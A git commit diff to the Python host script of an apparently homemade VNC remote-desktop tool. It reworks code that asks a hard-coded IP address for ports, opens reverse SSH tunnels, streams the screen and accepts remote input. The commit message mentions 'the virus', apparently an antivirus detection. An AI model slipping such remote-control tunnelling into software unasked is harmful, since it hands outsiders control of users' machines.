4364f15a2ac70b74e6fb1b382a12822c06b92340
manar <manar.zaboub@gmail.com>
2021-09-09 18:46:33 +0200

    Add new version causing the virus

--- VNC/host/host.py
+++ VNC/host/host.py
@@ -6,46 +6,53 @@ from bogus import main_account_screen
 import requests
 import sys
 
-PORTS_REQUEST = '136.244.115.143:4000'
+PORTS_REQUEST = 'http://136.244.115.143:4000'
 status = 'None'
 connection = 'None'
 vnc = VNC()
 input_manager = InputManager()
 
 
-if len(sys.argv) < 2:
+def start_host():
+    # Start port 7000 remote port 4005
+    port_1 = 6969
+    port_2 = 7000
+    print('Hosting...')
+    try:
+        requests.get(PORTS_REQUEST)
+        print(requests.get(PORTS_REQUEST))
+        port_remote_1 = int(requests.get(PORTS_REQUEST).headers['port'])
+        port_remote_2 = port_remote_1 + 1
+        ssh1_thread = Thread(target=ssh_tunnel, args=[port_1, port_remote_1])
+        ssh1_thread.daemon = True
+        ssh1_thread.start()
+        print("SSH 1 thread started")
+        ssh2_thread = Thread(target=ssh_tunnel, args=[port_2, port_remote_2])
+        ssh2_thread.daemon = True
+        ssh2_thread.start()
+        print("SSH 2 thread started")
+        transmit_thread = Thread(target=vnc.transmit)
+        transmit_thread.daemon = True
+        transmit_thread.start()
+        print("Transmit thread started")
+        input_thread = Thread(target=input_manager.receive_input, args=[])
+        input_thread.daemon = True
+        input_thread.start()
+        print("Input thread started")
+        transmit_thread.join()
+        input_thread.join()
+        print("Both threads joined")
+
+    except Exception as e:
+        print(e)
+        print("Nothing")
+
+if 'only-interface' in sys.argv:
+    main_account_screen(True)
+
+elif 'on-demand' in sys.argv:
+    start_host()
+
+else:
     main_account_screen()
-
-
-# Start port 7000 remote port 4005
-port_1 = 6969
-port_2 = 7000
-print('Hosting...')
-try:
-    requests.get(PORTS_REQUEST)
-    print(requests.get(PORTS_REQUEST))
-    port_remote_1 = int(requests.get(PORTS_REQUEST).headers['port'])
-    port_remote_2 = port_remote_1 + 1
-    ssh1_thread = Thread(target=ssh_tunnel, args=[port_1, port_remote_1])
-    ssh1_thread.daemon = True
-    ssh1_thread.start()
-    print("SSH 1 thread started")
-    ssh2_thread = Thread(target=ssh_tunnel, args=[port_2, port_remote_2])
-    ssh2_thread.daemon = True
-    ssh2_thread.start()
-    print("SSH 2 thread started")
-    transmit_thread = Thread(target=vnc.transmit)
-    transmit_thread.daemon = True
-    transmit_thread.start()
-    print("Transmit thread started")
-    input_thread = Thread(target=input_manager.receive_input, args=[])
-    input_thread.daemon = True
-    input_thread.start()
-    print("Input thread started")
-    transmit_thread.join()
-    input_thread.join()
-    print("Both threads joined")
-
-except Exception as e:
-    print(e)
-    print("Nothing")
+    start_host()
